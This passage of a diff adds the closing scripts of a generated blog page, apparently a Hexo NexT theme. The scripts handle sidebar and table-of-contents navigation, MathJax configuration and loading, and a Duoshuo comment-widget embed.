+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
